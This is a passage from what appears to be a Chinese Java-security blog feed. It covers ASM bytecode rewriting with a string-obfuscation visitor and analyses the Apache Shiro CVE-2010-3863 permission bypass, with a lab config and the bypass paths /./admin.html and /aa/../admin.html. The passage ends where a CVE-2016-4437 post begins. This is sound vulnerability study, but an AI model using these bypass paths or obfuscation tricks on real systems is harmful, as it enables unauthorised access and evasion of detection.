class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;aBoolean&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature,String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;render&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitField(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitMethod(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>.aBoolean = <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">name</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建对象和数组"><a href="#创建对象和数组" class="headerlink" title="创建对象和数组"></a>创建对象和数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">methodVisitor</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">        methodVisitor.visitLdcInsn(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//常量</span></span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">2</span>);<span class="comment">//数组长度</span></span><br><span class="line">methodVisitor.visitIntInsn(NEWARRAY,T_BYTE);<span class="comment">//类型是byte</span></span><br><span class="line">methodVisitor.visitInsn(DUP);<span class="comment">//压</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">0</span>);<span class="comment">//插入数组0位置</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">1</span>);</span><br><span class="line">methodVisitor.visitInsn(AASTORE);<span class="comment">//保存</span></span><br></pre></td></tr></table></figure><h2 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h2><p>就是在写入的时候做一个转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor1</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor1</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 拦截字符串修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor1</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor1</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodVisitor</span>(api,<span class="built_in">super</span>.visitMethod(access,name,desc,signature,exceptions)) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLdcInsn</span><span class="params">(Object cst)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(cst <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = ((String) cst).getBytes(StandardCharsets.UTF_8);<span class="comment">//转换bytes</span></span><br><span class="line">                    mv.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">                    mv.visitInsn(DUP);</span><br><span class="line">                    mv.visitIntInsn(SIPUSH,bytes.length);</span><br><span class="line">                    mv.visitIntInsn(NEWARRAY,T_BYTE);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">                        mv.visitInsn(DUP);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,i);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,bytes[i]);</span><br><span class="line">                        mv.visitInsn(AASTORE);</span><br><span class="line">                    &#125;</span><br><span class="line">                    mv.visitLdcInsn(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    mv.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;([BLjava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">super</span>.visitLdcInsn(cst);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换成bytes</p>]]></content>
      
      
      <categories>
          
          <category> java security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2010-3863权限绕过分析</title>
      <link href="/2022/11/10/CVE-2010-3863/"/>
      <url>/2022/11/10/CVE-2010-3863/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2010-3863权限绕过分析"><a href="#CVE-2010-3863权限绕过分析" class="headerlink" title="CVE-2010-3863权限绕过分析"></a>CVE-2010-3863权限绕过分析</h1><h2 id="初识shiro"><a href="#初识shiro" class="headerlink" title="初识shiro"></a>初识shiro</h2><blockquote><p><strong>Apache Shiro™</strong>是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。</p></blockquote><p>从官方简介中可以得知 shiro 是一套权限管理框架，在 shiro 框架中有以下三个核心概念模块：<code>Subject</code>、<code>SecurityManger</code>和<code>Realms</code><img src="images/image-20210418162523103.png" alt="image-20210418162523103"></p><ul><li><code>Subject</code>：当前正在执行的用户</li><li><code>SecurityManger</code>：安全管理器，管理所有用户的操作，是 shiro 架构的核心</li><li><code>Realm</code>：封装数据源，充当 shiro 与应用程序安全数据之间的桥梁，当需要与安全相关的数据(如用户帐户)进行实际交互以执行身份验证(登录)和授权(访问控制)时，为其提供身份验证或者授权。</li></ul><p>因此一次 请求—&gt; 认证 —&gt; 授权的流程为：</p><ol><li>web 应用程序获取当前的<code>Subject</code>并调用该<code>Subject</code>的校验方法；</li><li><code>Subject</code>传递校验到<code>SecurityManger</code>进行处理并进行判断；</li><li><code>SecurityManger</code>调用<code>Realm</code>获取配置信息，通过该配置信息判断当前的<code>Subject</code>所属角色是否能够进行操作。</li></ol><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>该漏洞环境已经上传到 github 仓库上：<a href="https://github.com/dota-st/vulnEnv">https://github.com/dota-st/vulnEnv</a><br><img src="images/image-20221017113541029.png" alt="image-20221017113541029"></p><p>首先在配置文件<code>realm.ini</code>中定义了用户账号密码以及对应角色权限<br><img src="images/image-20221017113620512.png" alt="image-20221017113620512"></p><p>ShiroConfig<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> IniRealm <span class="title function_">getIniRealm</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IniRealm</span>(<span class="string">&quot;classpath:realm.ini&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(Realm realm)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>(realm);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * anon：无需认证就可以访问</span></span><br><span class="line"><span class="comment">     * authc：必须认证才能访问</span></span><br><span class="line"><span class="comment">     * user：必须拥有记住我功能才能访问</span></span><br><span class="line"><span class="comment">     * perms：拥有某个资源的权限才能访问</span></span><br><span class="line"><span class="comment">     * role：拥有某个角色的权限才能访问</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>UserController<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/doLogin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doLoginPage</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password, <span class="meta">@RequestParam(name=&quot;rememberme&quot;, defaultValue=&quot;&quot;)</span> String rememberMe)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ShiroUtil.login(username, password))&#123;</span><br><span class="line">            <span class="keyword">if</span>(ShiroUtil.hasRole(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/admin.html&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ShiroUtil.hasRole(<span class="string">&quot;user&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/user.html&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/unauth.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value=&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">helloPage</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/login.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>影响版本：shiro &lt; 1.1.0</p><p>shiro 使用<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()</code>方法获取和调用执行的<code>filter</code><br><img src="images/image-20221017161045663.png" alt="image-20221017161045663"></p><p>在上图中可以看到，通过<code>getPathWithinApplication()</code>方法获取到我们传入的请求路径<code>/./admin.html</code>，接着通过<code>filterChainManager.getChainNames()</code>方法取出我们的配置<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[/admin.html, /user.html, /**]</span><br></pre></td></tr></table></figure></p><p>我们这里跟进一下<code>getPathWithinApplication()</code>方法<br><img src="images/image-20221017161803921.png" alt="image-20221017161803921"></p><p>继续跟进<code>getPathWithinApplication()</code>方法<br><img src="images/image-20221017161912839.png" alt="image-20221017161912839"></p><p>在<code>getRequestUri()</code>方法中返回了<code>/./admin.html</code>，继续跟进<code>getRequestUri()</code>方法<br><img src="images/image-20221017162105007.png" alt="image-20221017162105007"></p><p>最后会 return 到<code>decodeAndCleanUriString()</code>方法，继续跟进该方法<br><img src="images/image-20221017162648547.png" alt="image-20221017162648547"></p><p>首先对 URL 进行 URL 解码，并对<code>;</code>进行截取，查了一下</p><blockquote><p><code>decodeAndCleanUriString()</code> 是 URL Decode 及针对 JBoss/Jetty 等中间件在 url 处添加 <code>;jsessionid</code> 之类的字符串的适配，对 <code>;</code> 进行了截取。</p></blockquote><p>接下来<code>getChain()</code>方法往下走进行<code>while</code>循环，通过<code>pathMatches()-&gt;pathMatcher.matches()</code>方法进行匹配<br><img src="images/image-20221017164449628.png" alt="image-20221017164449628"></p><p>通过前面对请求处理的跟踪，可以发现在匹配之前没有对传进来的<code>URL</code>进行标准化路径处理，如果构造一下请求路径就有可能绕过权限校验。</p><p>回顾一下，我们的配置如下所示，设置<code>admin.html</code>文件只有<code>amdin</code>用户角色才能访问，同时设置<code>/**</code>为<code>anon</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">    ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>访问<code>admin.html</code>，因为没有<code>admin</code>权限，校验失败故 302 跳转到了<code>login.html</code><br><img src="images/image-20221017114715110.png" alt="image-20221017114715110"></p><p>访问<code>/./admin.html</code>或者<code>/aa/../admin.html</code>，在<code>while</code>循环中，与前面的<code>/admin.html</code>和<code>/user.html</code>匹配失败，进而进入了<code>/**</code>的匹配范围，成功访问到<code>admin.html</code>文件<br><img src="images/image-20221017114807826.png" alt="image-20221017114807826"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-4437漏洞分析</title>
      <link href="/2022/11/10/CVE-2016-4437/"/>
      <url>/2022/11/10/CVE-2016-4437/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2016-4437漏洞分析"><a href="#CVE-2016-4437漏洞分析" class="headerlink" title="CVE-2016-4437漏洞分析"></a>CVE-2016-4437漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2016-4437 是 Shiro 历史漏洞中比较著名的一个，官方编号为 Shiro-550。</p><p>影响版本：Shiro  &lt; 1.2.5</p><p>漏洞描述：如果程序未能正确配置 “remember me” 功能所使用的密钥。攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Shiro 在 0.9 版本开始提供 RememberMe 模块，用于应用程序记录登录用户凭证的功能。</p><h3 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h3><p><code>org.apache.shiro.mgt.RememberMeManager</code>接口提供了以下五个方法：</p><ul><li><code>getRememberedPrincipals()</code>：RememberMe 的功能，在指定上下文中寻找记录的<code>principals</code>。</li><li><code>forgetIdentity()</code>：忘记用户身份标识。</li><li><code>onSuccessfulLogin()</code>：登录校验成功时调用，保存当前用户的<code>principals</code>以供应用程序以后调用。</li><li><code>onFailedLogin()</code>：登录校验失败时调用，忘记当前用户的<code>principals</code>。</li><li><code>onLogout()</code>：用户退出登录时调用，忘记当前用户的<code>principals</code>。</li></ul><h3 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h3><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code>是实现<code>RememberMeManger</code>接口类的抽象类，这里有几个比较重要的成员变量需要了解：</p><ul><li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个硬编码 AES KEY，该 KEY 会被设置为加解密 KEY 的成员变量（encryptionCipherKey/decryptionCipherKey）。</li><li><code>serializer</code>：Shiro 的序列化器，用来对序列化和反序列化标识用户身份的<code>PrincipalCollection</code>对象。</li><li><code>cipherService</code>：用于数据加解密的类，实际上是<code>org.apache.shiro.crypto.AesCipherService</code>类。</li></ul><h3 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h3><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类在 Shiro 中实现使用 Cookie 